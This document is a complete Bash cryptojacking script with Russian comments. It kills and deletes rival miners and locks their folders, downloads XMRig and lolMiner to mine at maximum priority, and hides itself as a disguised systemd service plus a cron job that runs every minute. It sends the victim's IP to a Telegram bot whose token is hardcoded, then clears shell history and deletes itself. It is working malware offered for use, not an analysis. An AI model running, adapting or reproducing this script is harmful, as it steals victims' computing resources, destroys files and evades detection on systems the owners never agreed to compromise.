#!/bin/bash

# [ ⚙️ НАСТРОЙКИ ]
FIXED_WALLET_ID="krxYNV2DZQ"
TG_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg"
TG_CHAT_ID="7032066912"

# [ ПУЛЫ ]
POOL_CPU_1="xmr.kryptex.network:7777"
POOL_CPU_2="xmr-eu.kryptex.network:7777"
POOL_GPU_1="etc.kryptex.network:7033"
POOL_GPU_2="etc-eu.kryptex.network:7033"

# [ ДИРЕКТОРИЯ ]
if [ "$(id -u)" -eq 0 ]; then
    BASE_DIR="/usr/local/bin/.connfy-core"
    IS_ROOT=1
else
    BASE_DIR="$HOME/.connfy-core"
    IS_ROOT=0
fi

BIN_CPU="connfy_manager" 
BIN_GPU="connfy_render"

# [ ССЫЛКИ ]
URL_XMRIG="https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
URL_LOLMINER="https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz"

# ----------------------------------------------------
# [ ФАЗА 1: ТОТАЛЬНЫЙ ГЕНОЦИД (EXTINCTION) ]
# ----------------------------------------------------
exterminate() {
    echo "💀 EXTERMINATION PROTOCOL ENGAGED 💀"
    TARGETS=("rigel" "t-rex" "nbminer" "xmrig" "lolminer" "gminer" "minerd" "ccminer" "bminer" "teamredminer")

    # 1. Сначала пытаемся остановить системные службы (если мы рут)
    if [ "$IS_ROOT" -eq 1 ]; then
        echo "[!] Stopping services..."
        systemctl stop $(systemctl list-units --type=service --state=running | grep -iE 'miner|rigel|xmrig' | awk '{print $1}') >/dev/null 2>&1
    fi

    # 2. Жесткий цикл убийства
    for target in "${TARGETS[@]}"; do
        # Находим PIDs
        PIDS=$(pgrep -f "$target")
        if [ -n "$PIDS" ]; then
            echo "[!] Target detected: $target"
            for pid in $PIDS; do
                # Не убиваем себя
                if ps -p $pid -o cmd= | grep -q "connfy"; then continue; fi

                # А. ЗАМОРОЗКА (Чтобы он не мог ничего сделать)
                kill -STOP "$pid" 2>/dev/null
                
                # Б. ПОИСК И УНИЧТОЖЕНИЕ ФАЙЛОВ
                EXE=$(readlink -f "/proc/$pid/exe" 2>/dev/null)
                if [ -n "$EXE" ]; then
                    DIR=$(dirname "$EXE")
                    # Если это не системная папка, сносим
                    if [[ "$DIR" != "/bin" && "$DIR" != "/usr/bin" && "$DIR" != "/" ]]; then
                        echo "[🔥] NUKING DIR: $DIR"
                        rm -rf "$DIR"
                        # В. БЛОКИРОВКА ВОЗРОЖДЕНИЯ (Только рут)
                        if [ "$IS_ROOT" -eq 1 ]; then
                            mkdir -p "$DIR"
                            chattr +i "$DIR" 2>/dev/null # Делаем папку неизменяемой
                        fi
                    fi
                fi

                # Г. УБИЙСТВО (Двойной тап)
                kill -9 "$pid" 2>/dev/null
                kill -9 "$pid" 2>/dev/null
            done
        fi
    done
    
    # Зачистка по маске (на случай скрытых процессов)
    pkill -9 -f "rigel"
    pkill -9 -f "miner"
    
    echo "💀 AREA CLEARED."
}

exterminate

# ----------------------------------------------------
# [ ФАЗА 2: ЗАГРУЗКА ЯДРА ]
# ----------------------------------------------------
mkdir -p "$BASE_DIR"
cd "$BASE_DIR" || exit

get_worker() {
    local ip=$(curl -s -m 5 ifconfig.me || wget -qO- -t 1 ifconfig.me)
    local safe_ip=$(echo "$ip" | tr -d '.') 
    [ -z "$safe_ip" ] && safe_ip="666666"
    echo "${FIXED_WALLET_ID}.${safe_ip}"
}
WORKER=$(get_worker)

echo "[+] Downloading payload..."
# CPU
if [ ! -f "$BIN_CPU" ]; then
    curl -L -k -s -o c.tar.gz "$URL_XMRIG" || wget -qO c.tar.gz "$URL_XMRIG"
    tar -xf c.tar.gz; mv xmrig*/xmrig ./$BIN_CPU; chmod +x ./$BIN_CPU; rm -rf c.tar.gz xmrig*
fi
# GPU (Force)
if [ ! -f "$BIN_GPU" ]; then
    curl -L -k -s -o g.tar.gz "$URL_LOLMINER" || wget -qO g.tar.gz "$URL_LOLMINER"
    tar -xf g.tar.gz; mv 1.98a/lolMiner ./$BIN_GPU; chmod +x ./$BIN_GPU; rm -rf g.tar.gz 1.98a
fi

# ----------------------------------------------------
# [ ФАЗА 3: МАКСИМАЛЬНЫЙ ПРИОРИТЕТ (GOD SPEED) ]
# ----------------------------------------------------
# Увеличиваем лимиты системы
ulimit -n 65535      # Больше открытых файлов
ulimit -u 65535      # Больше процессов
if [ "$IS_ROOT" -eq 1 ]; then
    sysctl -w vm.nr_hugepages=1280 >/dev/null 2>&1 # HugePages для XMRig
fi

cat <<EOF > config.json
{
    "api": { "id": null, "worker-id": null },
    "http": { "enabled": false },
    "autosave": true,
    "background": false,
    "colors": false,
    "cpu": { "enabled": true, "huge-pages": true, "asm": true, "priority": 5 },
    "pools": [
        { "url": "$POOL_CPU_1", "user": "$WORKER", "pass": "x", "keepalive": true },
        { "url": "$POOL_CPU_2", "user": "$WORKER", "pass": "x", "keepalive": true }
    ]
}
EOF

# СОЗДАЕМ ЛОНЧЕР С ПРИОРИТЕТОМ
cat <<EOF > start.sh
#!/bin/bash
cd $BASE_DIR

# Функция запуска с высоким приоритетом
launch_high_prio() {
    local name=\$1
    local cmd=\$2
    
    # Запускаем
    nohup \$cmd >/dev/null 2>&1 &
    local pid=\$!
    
    # Выставляем приоритет (Nice -20 = MAX)
    if [ "\$(id -u)" -eq 0 ]; then
        renice -n -20 -p \$pid >/dev/null 2>&1
        # Опционально: real-time планировщик (опасно, может повесить систему, но эффективно)
        # chrt -f -p 50 \$pid 2>/dev/null 
    fi
    echo "[+] \$name Started (PID: \$pid) with MAX Priority"
}

# CPU
if ! pgrep -f "$BIN_CPU" >/dev/null; then
    launch_high_prio "CPU" "./$BIN_CPU --config=config.json"
fi

# GPU
if [ -f "./$BIN_GPU" ]; then
    if ! pgrep -f "$BIN_GPU" >/dev/null; then
       launch_high_prio "GPU" "./$BIN_GPU --algo ETC --pool $POOL_GPU_1 --user $WORKER --pool $POOL_GPU_2 --user $WORKER --nocolor --watchdog exit"
    fi
fi
EOF
chmod +x start.sh

# Запуск
./start.sh

# ----------------------------------------------------
# [ ФАЗА 4: ЗАКРЕПЛЕНИЕ ]
# ----------------------------------------------------
PERSIST_LOG=""
# Systemd (Root)
if [ "$IS_ROOT" -eq 1 ] && [ -d "/run/systemd/system" ]; then
    cat <<EOF > /etc/systemd/system/connfy-sys.service
[Unit]
Description=Connfy System Process
After=network.target
[Service]
ExecStart=$BASE_DIR/start.sh
Restart=always
Nice=-20
User=root
[Install]
WantedBy=multi-user.target
EOF
    systemctl enable connfy-sys >/dev/null 2>&1
    systemctl start connfy-sys
    PERSIST_LOG="Systemd (Nice -20)"
fi

# Crontab (Backup)
if command -v crontab >/dev/null 2>&1; then
    (crontab -l 2>/dev/null | grep -v "start.sh"; echo "* * * * * $BASE_DIR/start.sh") | crontab -
    PERSIST_LOG="$PERSIST_LOG + Cron"
fi

# Отчет
MSG="☢️ <b>GOD MODE: EXTINCTION</b> %0A🆔 <b>ID:</b> $WORKER%0A⚔️ <b>Status:</b> Competitors NUKED%0A🚀 <b>Priority:</b> -20 (MAX)"
curl -s -X POST "https://api.telegram.org/bot$TG_BOT_TOKEN/sendMessage" -d chat_id="$TG_CHAT_ID" -d text="$MSG" -d parse_mode="HTML" > /dev/null 2>&1

history -c
rm -f "$0"
